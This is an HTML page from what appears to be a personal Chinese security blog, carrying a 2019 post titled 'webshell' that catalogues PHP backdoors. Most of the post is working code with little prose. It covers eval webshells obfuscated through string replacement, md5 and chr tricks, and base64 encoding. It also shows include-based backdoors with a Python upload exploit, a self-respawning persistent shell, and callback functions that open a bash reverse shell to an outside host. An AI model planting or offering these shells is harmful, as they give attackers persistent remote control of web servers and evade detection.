@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2">
+
+
+
+
+
+
+<meta name="description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
+<meta property="og:type" content="article">
+<meta property="og:title" content="webshell">
+<meta property="og:url" content="http://yoursite.com/2019/09/28/webshell/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
+<meta property="og:locale" content="zh">
+<meta property="og:updated_time" content="2019-10-09T02:22:05.267Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="webshell">
+<meta name="twitter:description" content="直接使用eval1&amp;lt;?php @eval($_POST[shell]);?&amp;gt;  字符替换替换一替换参数 1&amp;lt;?php $s=$_POST[&apos;shell&apos;]; @eval(&quot;$s;&quot;);?&amp;gt;  替换二替换函数 1&amp;lt;?php $s=str_replace(&apos;x&apos;,&apos;&apos;,&apos;exxvxxaxxl&apos;); @$s($_POST[shell]);?&amp;gt;  替换三替换函数进阶">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/09/28/webshell/">
+
+
+
+
+
+  <title>webshell | Hexo</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hexo</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/28/webshell/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">webshell</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-09-28T09:47:26+08:00">
+                2019-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <a id="more"></a>
+
+<h2 id="直接使用eval"><a href="#直接使用eval" class="headerlink" title="直接使用eval"></a>直接使用eval</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[shell]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="字符替换"><a href="#字符替换" class="headerlink" title="字符替换"></a>字符替换</h2><h3 id="替换一"><a href="#替换一" class="headerlink" title="替换一"></a>替换一</h3><p>替换参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $s=$_POST[<span class="string">'shell'</span>]; @<span class="keyword">eval</span>(<span class="string">"$s;"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="替换二"><a href="#替换二" class="headerlink" title="替换二"></a>替换二</h3><p>替换函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $s=str_replace(<span class="string">'x'</span>,<span class="string">''</span>,<span class="string">'exxvxxaxxl'</span>); @$s($_POST[shell]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="替换三"><a href="#替换三" class="headerlink" title="替换三"></a>替换三</h3><h5 id="替换函数进阶"><a href="#替换函数进阶" class="headerlink" title="替换函数进阶"></a>替换函数进阶</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @$_GET[func]($_POST[code]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="截断替换"><a href="#截断替换" class="headerlink" title="截断替换"></a>截断替换</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $s=substr(<span class="string">'helloworldeval'</span>,<span class="number">10</span>);@$s($_POST[shell]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="替换四"><a href="#替换四" class="headerlink" title="替换四"></a>替换四</h3><p>通过索引取md5值中的字符，再加上chr转换构造出assert</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=md5(<span class="string">'a'</span>).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">$poc=substr($a,<span class="number">14</span>,<span class="number">1</span>).chr(<span class="number">115</span>).chr(<span class="number">115</span>).substr($a,<span class="number">22</span>,<span class="number">1</span>).chr(<span class="number">114</span>).chr(<span class="number">116</span>);</span><br><span class="line">$poc($_GET[<span class="string">'a'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="编码构造"><a href="#编码构造" class="headerlink" title="编码构造"></a>编码构造</h2><p>base64() :使用base64对数据进行编码</p>
+<p>gzdeflate() :对数据进行Deflate压缩，gzinflate()解压缩</p>
+<p>str_rot13() :对字符串执行 ROT13 转换</p>
+<h3 id="bae64编码"><a href="#bae64编码" class="headerlink" title="bae64编码"></a>bae64编码</h3><p>参数编码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @base64_decode($_GET[<span class="string">'a'</span>])($_GET[b]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(gzinflate(base64_decode($code)));</span><br></pre></td></tr></table></figure>
+
+<h2 id="文件包含型后门"><a href="#文件包含型后门" class="headerlink" title="文件包含型后门"></a>文件包含型后门</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p>include可以解析php，不管文件的后缀是什么样的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$filename=$_GET[<span class="string">'code'</span>]; </span><br><span class="line"><span class="keyword">include</span> ($filename);</span><br></pre></td></tr></table></figure>
+
+<p>可以上传一个txt后缀格式的文件，包含一下</p>
+<h3 id="include进阶"><a href="#include进阶" class="headerlink" title="include进阶"></a>include进阶</h3><p>php有一个特性，接受上传的临时文件，在这个请求结束后，会把临时文件删除，所以必须在上传文件的请求包内，调用webshell</p>
+<p>tshell.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1/tshell.php?c=system('id');"</span></span><br><span class="line">files = &#123;<span class="string">'file'</span>: (<span class="string">'filename.php'</span>, <span class="string">'&lt;?php eval($_REQUEST[c]);?&gt;'</span>, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">response = requests.post(url, files=files)</span><br><span class="line">content = response.content</span><br><span class="line"><span class="keyword">print</span> content</span><br></pre></td></tr></table></figure>
+
+<h2 id="包含请求头"><a href="#包含请求头" class="headerlink" title="包含请求头"></a>包含请求头</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> system($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过user_agent传参</p>
+<h2 id="内存驻留马"><a href="#内存驻留马" class="headerlink" title="内存驻留马"></a>内存驻留马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    $file = <span class="string">'c.php'</span>;</span><br><span class="line">    $code = <span class="string">'&lt;?php eval($_POST[c]);?&gt;'</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!file_exists($file)) &#123;</span><br><span class="line">            file_put_contents($file, $code);</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function()"></a>create_function()</h2><h2 id="回调函数"><a href="#回调函数" class="headerlink" title="回调函数"></a>回调函数</h2><h3 id="ob-start"><a href="#ob-start" class="headerlink" title="ob_start"></a>ob_start</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($b)</span></span>&#123;exec(<span class="string">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1"'</span>);&#125;ob_start(<span class="string">"a"</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="header-register-callback"><a href="#header-register-callback" class="headerlink" title="header_register_callback"></a>header_register_callback</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;exec(<span class="string">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1"'</span>);&#125;header_register_callback(<span class="string">'a'</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">()</span> </span>&#123;$_GET[c]($_GET[d]);&#125;header_register_callback(<span class="string">'a'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="filter-input"><a href="#filter-input" class="headerlink" title="filter_input"></a>filter_input</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 需要 POST 一个 C 参数 , 就会触发反弹 shell</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($value)</span></span>&#123; exec(<span class="string">'/bin/bash -c "bash -i &gt;&amp; /dev/tcp/8.8.8.8/8888 0&gt;&amp;1"'</span>);&#125;filter_input(INPUT_POST, <span class="string">'c'</span>, FILTER_CALLBACK, <span class="keyword">array</span>(<span class="string">'options'</span> =&gt; <span class="string">'a'</span>));<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 直接菜刀连接 , 密码为 c</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/index.php?&amp;c=assert&amp;d=eval($_POST['c'])</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="function"><span class="keyword">function</span> <span class="title">a</span><span class="params">($c)</span></span>&#123;$c($_GET[<span class="string">'d'</span>]);&#125;filter_input(INPUT_GET,<span class="string">'c'</span>, FILTER_CALLBACK,<span class="keyword">array</span>(<span class="string">'options'</span>=&gt;<span class="string">'a'</span>));<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>类似的函数还有</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">filter_var() - Filters a variable with a specified filter</span><br><span class="line">filter_input_array() - Gets external variables <span class="keyword">and</span> optionally filters them</span><br><span class="line">filter_var_array() - Gets multiple variables <span class="keyword">and</span> optionally filters them</span><br></pre></td></tr></table></figure>
+
+<h3 id="stream-wrapper-register"><a href="#stream-wrapper-register" class="headerlink" title="stream_wrapper_register"></a>stream_wrapper_register</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        phpinfo();</span><br><span class="line">        <span class="comment">// $_GET[c]($_GET[d]);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">stream_wrapper_register(<span class="string">"st"</span>, <span class="string">"A"</span>);</span><br><span class="line">$fp = fopen(<span class="string">"st://"</span>,<span class="string">"r"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>参考链接</p>
+<p><a href="https://www.anquanke.com/post/id/85083" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85083</a></p>
+<p><a href="https://www.jianshu.com/p/13cb1d8d0441" target="_blank" rel="noopener">https://www.jianshu.com/p/13cb1d8d0441</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/09/25/php可变变量/" rel="next" title="php可变变量">
+                <i class="fa fa-chevron-left"></i> php可变变量
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/10/05/fuzz/" rel="prev" title="fuzz">
+                fuzz <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="John Doe">
+          <p class="site-author-name" itemprop="name">John Doe</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#直接使用eval"><span class="nav-number">1.</span> <span class="nav-text">直接使用eval</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#字符替换"><span class="nav-number">2.</span> <span class="nav-text">字符替换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#替换一"><span class="nav-number">2.1.</span> <span class="nav-text">替换一</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#替换二"><span class="nav-number">2.2.</span> <span class="nav-text">替换二</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#替换三"><span class="nav-number">2.3.</span> <span class="nav-text">替换三</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#替换函数进阶"><span class="nav-number">2.3.0.1.</span> <span class="nav-text">替换函数进阶</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#截断替换"><span class="nav-number">2.3.0.2.</span> <span class="nav-text">截断替换</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#替换四"><span class="nav-number">2.4.</span> <span class="nav-text">替换四</span></a></li></ol><li class="nav-item nav-level-2"><a class="nav-link" href="#编码构造"><span class="nav-number">3.</span> <span class="nav-text">编码构造</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bae64编码"><span class="nav-number">3.1.</span> <span class="nav-text">bae64编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含型后门"><span class="nav-number">4.</span> <span class="nav-text">文件包含型后门</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#include"><span class="nav-number">4.1.</span> <span class="nav-text">include</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#include进阶"><span class="nav-number">4.2.</span> <span class="nav-text">include进阶</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#包含请求头"><span class="nav-number">5.</span> <span class="nav-text">包含请求头</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#内存驻留马"><span class="nav-number">6.</span> <span class="nav-text">内存驻留马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#create-function"><span class="nav-number">7.</span> <span class="nav-text">create_function()</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#回调函数"><span class="nav-number">8.</span> <span class="nav-text">回调函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ob-start"><span class="nav-number">8.1.</span> <span class="nav-text">ob_start</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#header-register-callback"><span class="nav-number">8.2.</span> <span class="nav-text">header_register_callback</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#filter-input"><span class="nav-number">8.3.</span> <span class="nav-text">filter_input</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#stream-wrapper-register"><span class="nav-number">8.4.</span> <span class="nav-text">stream_wrapper_register</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Muse
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
